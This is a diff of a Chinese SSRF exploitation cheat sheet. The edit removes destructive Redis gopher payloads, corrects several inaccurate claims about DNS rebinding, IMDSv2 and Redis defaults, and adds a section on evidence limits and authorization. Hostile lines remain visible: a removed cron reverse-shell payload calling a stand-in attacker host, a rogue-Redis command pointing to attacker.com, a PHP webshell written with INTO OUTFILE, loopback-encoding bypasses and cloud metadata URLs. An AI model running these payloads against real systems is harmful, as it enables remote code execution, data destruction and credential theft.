@@ -74,7 +74,7 @@ http://0177.0.0.1 (八进制)
 http://2130706433 (十进制)
 http://0x7f000001 (十六进制)
 http://127.1 (简写)
-http://127.0.0.1.nip.io (DNS重绑定)
+http://127.0.0.1.nip.io (静态通配解析不等于 DNS 重绑定)
 ```
 **语法解析：**
 - `0177` — 127的八进制表示 _value_
@@ -167,8 +167,8 @@ http://169.254.169.254/latest/user-data/
 - `http://169.254.169.254/latest/user-data/` — 第1步操作 _command_
 - `可能包含敏感信息、API密钥、启动脚本` — 第2步操作 _value_
 
-**4. 使用IMDSv2绕过**
-> 绕过IMDSv2保护
+**4. IMDSv2 请求前提**
+> 合法 IMDSv2 流程不等于自动绕过；须能发送 PUT、自定义头并回传 token，且仍受元数据服务配置限制。
 ```
 如果IMDSv2被强制:
 1. 先获取token:
@@ -331,7 +331,7 @@ http://169.254.169.254/computeMetadata/v1/
 
 **防御措施：** 防御措施：
 1. 限制元数据服务访问
-2. 使用GCP Instance Metadata API v2
+2. 按 GCP 官方元数据服务配置限制访问；不存在此处所称的通用“Metadata API v2”防御开关
 3. 实施网络隔离
 4. 监控异常元数据访问
 
@@ -466,7 +466,7 @@ dict://127.0.0.1:11211/stats
 **3. Gopher协议**
 > 使用Gopher协议攻击内网服务
 ```
-gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
+[已移除破坏性/长度不匹配的 FLUSHALL 序列；存在性验证使用批准的合成 PING/只读标记，禁止清空数据库]
 构造Redis命令
 ```
 **语法解析：**
@@ -554,10 +554,10 @@ _后面是实际发送的数据
 **2. 攻击Redis**
 > 写入cron任务反弹Shell
 ```
-gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
+[已移除破坏性/长度不匹配的 FLUSHALL 序列；存在性验证使用批准的合成 PING/只读标记，禁止清空数据库]
 ```
 **语法解析：**
-- `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a` — 攻击载荷 _value_
+[已移除破坏性/长度不匹配的 FLUSHALL 序列；存在性验证使用批准的合成 PING/只读标记，禁止清空数据库]
 
 **3. 攻击MySQL**
 > 攻击MySQL数据库
@@ -836,7 +836,7 @@ http://0177.0.0.1 (八进制)
 http://2130706433 (十进制)
 http://0x7f000001 (十六进制)
 http://127.1 (简写)
-http://127.0.0.1.nip.io (DNS重绑定)
+http://127.0.0.1.nip.io (静态通配解析不等于 DNS 重绑定)
 http://127.0.0.1.xip.io
 ```
 **语法解析：**
@@ -980,21 +980,21 @@ http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network` — 参数与载荷内�
 **3. 自建DNS服务器**
 > 自建DNS重绑定服务器
 ```
-# 使用dnspython搭建
-from dnslib import *
+# 仅演示轮换状态的伪代码，不是可运行 DNS 服务器。
+# dnslib 与 dnspython 是不同库；真实 resolver 须返回 DNS 响应对象。
 class RebindResolver:
     def __init__(self):
         self.count = 0
-    def resolve(self, request):
+    def choose_example_address(self):
         self.count += 1
         if self.count % 2 == 1:
-            return "1.2.3.4"  # 外网IP
+            return "192.0.2.1"  # 文档地址，非实际公网服务
         else:
             return "127.0.0.1"  # 内网IP
 ```
 **语法解析：**
-- `# 使用dnspython搭建
-from dnslib import *
+- `# 仅演示轮换状态的伪代码，不是可运行 DNS 服务器。
+# dnslib 与 dnspython 是不同库；真实 resolver 须返回 DNS 响应对象。
 class RebindResolver:
     def __init__(s` — 攻击载荷 _value_
 
@@ -1136,7 +1136,7 @@ python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
 
 **概述：** SSRF攻击Redis是最经典的内网服务利用场景，通过gopher://协议向Redis发送命令，可写入WebShell、SSH公钥、Crontab定时任务等，从SSRF直接升级为服务器RCE。
 
-**漏洞原理：** Redis默认无认证且监听0.0.0.0:6379。SSRF通过gopher://发送Redis命令：1)SET/CONFIG SET dir+dbfilename写WebShell到Web目录 2)写SSH公钥到/root/.ssh/authorized_keys 3)写Crontab反弹Shell 4)主从复制加载恶意模块(RCE)。
+**漏洞原理：** Redis 的监听、认证、保护模式及 ACL 依赖版本与部署，不能假设默认对外开放。SSRF通过gopher://发送Redis命令：1)SET/CONFIG SET dir+dbfilename写WebShell到Web目录 2)写SSH公钥到/root/.ssh/authorized_keys 3)写Crontab反弹Shell 4)主从复制加载恶意模块(RCE)。
 
 **利用方法：** 完整利用流程：
 1. 通过SSRF探测Redis
@@ -1186,8 +1186,7 @@ MySQL通信协议:
 # 需要使用工具生成
 gopher://127.0.0.1:3306/_[MySQL Protocol Data]
 
-# 使用sqlmap
-gopher://127.0.0.1:3306/_[sqlmap生成的payload]
+# 未提供可验证的 sqlmap Gopher 生成接口；此处只是协议占位符，不是工具输出。
 ```
 **语法解析：**
 - `gopher://` — Gopher协议前缀，允许发送原始TCP数据 _command_
@@ -1254,3 +1253,14 @@ SELECT "<?php @eval($_POST[cmd]);?>" INTO OUTFILE "/var/www/html/shell.php";
 4. 禁用文件写入功能
 
 ---
+
+
+## 复核后的协议与证据边界
+
+- 仅接收 URL 不等于 SSRF 漏洞；须证明越过预期访问边界。只测试批准的单个 canary 主机/端口，不能由响应时间推定任意端口开放，也不默认扫描内网、读取密钥或使用窃取的凭据。
+- URL scheme 大小写通常不敏感，但文件路径大小写取决于文件系统；`/ETC/PASSWD` 并非 Linux 上 `/etc/passwd` 的通用等价路径。file 读取仍受客户端协议支持、文件权限与响应回传约束。
+- `host#@127.0.0.1` 的片段不改变标准解析后的主机；`127.0.0.1.example.invalid` 也不是回环地址本身。非规范 IP、NUL、CRLF、反斜杠与双编码依赖实际解析器，不是通用有效 URL。
+- DNS 重绑定需要实际验证/连接的重复解析与可控响应。静态通配 DNS 不是重绑定，低 TTL 也不保证第二次查询或选址顺序。只用自有测试域；第三方服务与示例域名的实时行为未验证。防御应检查所有 A/AAAA 结果及每跳重定向，并把校验地址绑定到实际连接，保留正确 Host/SNI，结合出口限制。
+- AWS IMDSv2 的正常 token 请求不是默认可绕过；GCP 的 Metadata-Flavor、Azure 的 Metadata 请求头须由实际服务端客户端发送。凭据访问还依赖附加身份、受众、IAM/RBAC 与端点配置，不意味着控制所有云资源。常规重定向不会自动创造这些请求头。
+- DICT、Gopher、LDAP、TFTP 支持依赖客户端及构建/重定向协议策略。DICT 不是通用 shell；Gopher 占位符、错误 RESP 长度或认证握手不能作为可运行证明。MySQL 挑战应答/认证插件也使固定字节重放并非通用登录方案。
+- Redis 文件写入链依赖权限、配置、持久化格式与消费者解析器；RDB 不等于纯文本文件。所有状态变更需单独授权与恢复计划。本次未请求元数据、运行 DNS 服务或发送任何协议载荷。
